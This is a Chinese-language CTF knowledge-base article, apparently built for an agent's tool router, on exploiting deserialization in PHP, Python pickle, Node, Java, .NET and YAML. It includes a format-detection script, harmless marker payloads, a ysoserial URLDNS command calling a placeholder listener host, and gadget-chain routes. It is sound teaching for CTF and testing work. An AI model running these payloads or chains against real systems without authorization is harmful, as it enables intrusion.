---
id: "ctf-website/05-deserialization/deserialization"
title: "Deserialization Vulnerabilities"
title_en: "Deserialization Vulnerabilities"
summary: >
  反序列化题面的重点是先识别格式、入口、类路径/依赖、可触发魔术方法和回显/回连 oracle，再选择 PHP/Pickle/Node/Java/.NET/YAML/Hessian/Jackson 等 gadget 路线。本篇给出 magic bytes 识别、格式路由矩阵、最小 harmless marker、DNS/HTTP callback、gadget 选择、成功/失败样本和 Evidence 模板。
summary_en: >
  Deserialization work starts by identifying format, entry point, classpath/dependencies, magic method triggers, and echo/callback oracles, then routing to PHP/Pickle/Node/Java/.NET/YAML/Hessian/Jackson gadget families. Includes magic-byte detection, format routing, marker payloads, DNS/HTTP callbacks, gadget choices, success/failure samples, and evidence templates.
board: "ctf-website"
category: "05-deserialization"
signals: ["deserialization", "反序列化", "pickle", "PHP unserialize", "Java gadget chain", "ysoserial", "Hessian", "ViewState", "YAML"]
mcp_tools: ["http_probe", "kb_router"]
keywords: ["反序列化", "deserialization", "PHP反序列化", "Java gadget", "pickle", "ysoserial", "node-serialize", "YAML反序列化", ".NET ViewState"]
difficulty: "advanced"
tags: ["deserialization", "gadget", "ctf", "injection"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: ["ctf-website/04-ssrf/ssrf", "ctf-website/03-injection/prototype-pollution"]
---
# Deserialization Vulnerabilities

反序列化不是“见到 blob 就上 gadget”。先确认格式、入口、依赖、触发点、回显或回连，再选链。CTF 里最容易失误的是格式识别错误、payload 被 Base64/URL/签名包裹、或者 gadget 触发了但没有可见 oracle。

## 输入信号

| 信号 | 立即动作 | 命中样本 | 失败样本 |
|---|---|---|---|
| Base64 以 `rO0AB` 开头 | Java 序列化路线 | URLDNS/DNS callback | Base64 只是普通 token |
| PHP `O:`, `a:`, `s:` | PHP serialize 路线 | `__wakeup/__destruct` 错误或输出变化 | 数据被 JSON 包裹未 unserialize |
| Python pickle `gAS`, `\x80\x04` | pickle opcode 路线 | 自定义 marker 被执行/回显 | Unpickler 限制全部拒绝 |
| Node `_$$ND_FUNC$$_` | node-serialize 路线 | 函数字段被还原 | JSON.parse 不执行 |
| `__VIEWSTATE` | .NET ViewState | MAC/validationKey 线索 | ViewStateUserKey/MAC 阻断 |
| YAML/XML/Hessian/Jackson 类型字段 | 多态反序列化 | 类型实例化错误/回连 | 类型白名单拒绝 |

## 工作流

```text
抽取 blob 与编码层
  → magic bytes / 类型字段识别
  → 建 marker payload 和 baseline oracle
  → 指纹语言、依赖、类路径、过滤器
  → 选择 gadget 或业务类链
  → 用回显、DNS/HTTP callback、状态差异记录 Evidence
```

## 0. 格式识别脚本

```python
#!/usr/bin/env python3
import argparse
import base64
import binascii
import json
import re

MAGIC = [
    (b"\xac\xed\x00\x05", "java-serialized"),
    (b"rO0AB", "java-base64"),
    (b"O:", "php-object"),
    (b"a:", "php-array"),
    (b"\x80\x04", "python-pickle4"),
    (b"\x80\x05", "python-pickle5"),
    (b"_$$ND_FUNC$$_", "node-serialize"),
    (b"AAEAAAD", ".net-binaryformatter-base64"),
    (b"---", "yaml"),
]

def layers(raw):
    yield "raw", raw
    for name, fn in [
        ("url", lambda x: bytes.fromhex(x.decode().replace("%", ""))),
        ("base64", lambda x: base64.b64decode(x + b"=" * (-len(x) % 4))),
        ("hex", lambda x: binascii.unhexlify(re.sub(rb"\s+", b"", x))),
    ]:
        try:
            yield name, fn(raw)
        except Exception:
            pass

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("blob")
    args = ap.parse_args()
    raw = args.blob.encode()
    for layer, data in layers(raw):
        hits = [fmt for magic, fmt in MAGIC if data.startswith(magic) or magic in data[:80]]
        print(json.dumps({"layer": layer, "len": len(data), "hits": hits, "prefix_hex": data[:24].hex()}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

## 1. 路由矩阵

| 格式 | 指纹 | 第一 oracle | 下一步 |
|---|---|---|---|
| PHP serialize | `O:<len>:"Class"` | 修改普通属性看输出 | 找 magic method 和类链 |
| Python pickle | `\x80`, `GLOBAL`, `REDUCE` | marker print/error | opcode/白名单绕过 |
| Java | `aced0005` / `rO0AB` | URLDNS callback | 依赖/gadget 指纹 |
| Node serialize | `_$$ND_FUNC$$_` | IIFE marker | require/module 限制 |
| .NET ViewState | `__VIEWSTATE` | MAC/错误文本 | validationKey/ViewStateUserKey |
| YAML/Jackson/Hessian | type tag/class name | 类型实例化错误 | 多态 gadget/业务类 |

## 2. Java URLDNS callback

```bash
# 先用 DNS/HTTP callback 证明 readObject 触发，再换更高价值链
java -jar ysoserial.jar URLDNS "http://case-id.listener.example" | base64 -w0
```

Evidence：callback 域名、时间、来源 IP、目标参数、响应错误。没有 callback 时，不要直接升级 gadget，先确认编码层、签名、压缩和入口是否真的走反序列化。

## 3. PHP / Python / Node marker

```python
#!/usr/bin/env python3
import pickle
import base64

class Marker:
    def __reduce__(self):
        return (print, ("PICKLE_MARKER",))

print(base64.b64encode(pickle.dumps(Marker())).decode())
```

```json
{"marker":"_$$ND_FUNC$$_function(){return 'NODE_SERIALIZE_MARKER'}()"}
```

```text
O:8:"stdClass":1:{s:6:"marker";s:10:"PHP_MARKER";}
```

这些 marker 用来判断“是否执行/还原/进入错误分支”，不是最终链。成功样本是 marker 回显、错误栈变化、callback 到达或业务状态变化。

## 4. Gadget 选择矩阵

| 语言 | 证据 | 常见路线 |
|---|---|---|
| PHP | class name、Composer lock、magic method | `__destruct`, `__toString`, Phar metadata, SoapClient SSRF |
| Java | classpath、依赖版本、JDK | URLDNS, CommonsCollections, Spring, Groovy, Hessian/Dubbo |
| Python | pickle opcode、find_class 限制 | `__reduce__`, opcode 手写, 已加载模块 |
| Node | node-serialize/serialize-javascript | IIFE, prototype pollution 串联 |
| .NET | formatter、ViewState、MAC | ysoserial.net format/gadget 匹配 |
| Ruby/YAML | type tag、Rails/Gem 版本 | YAML object graph, ERB/Gem gadgets |

## 5. 入口变体

| 包裹方式 | 操作 |
|---|---|
| Cookie | URL/base64 双层编码，注意 `;` 截断 |
| JSON field | payload 字符串转义，Content-Type 固定 |
| multipart upload | filename/content metadata |
| session store | 修改 session cookie 或服务端 session 文件 |
| message queue | body + headers 同时带类型 |
| cache/job import | 上传配置文件后触发 worker |

## 攻击链

```text
blob 识别
  → marker oracle
  → 依赖/类路径指纹
  → gadget/业务类链
  → callback、回显、文件、SSRF、flag 差异
```

## Evidence

| 项 | 记录内容 |
|---|---|
| blob | 原始值、编码层、magic bytes、参数位置 |
| 格式 | 语言/库/formatter、错误文本、依赖证据 |
| marker | marker payload、回显/callback/状态差异 |
| gadget | 链名、前置依赖、触发方法、输入输出 |
| 成功样本 | callback、命令输出、文件读取、SSRF、flag 或业务状态变化 |
| 失败样本 | magic 不匹配、签名/MAC 拒绝、类不存在、filter 拒绝、无触发点 |
| 下一跳 | Soap/SSRF 转 04-ssrf；PP 串联转 prototype-pollution；凭据转 database/payment |

## MCP 工具映射

| 步骤 | MCP 工具 | 说明 |
|---|---|---|
| 入口探测 | `http_probe` | 固定 blob 参数、编码层和响应 oracle |
| 知识路由 | `kb_router` | 按 deserialization、pickle、ysoserial、ViewState、Hessian 搜索 |
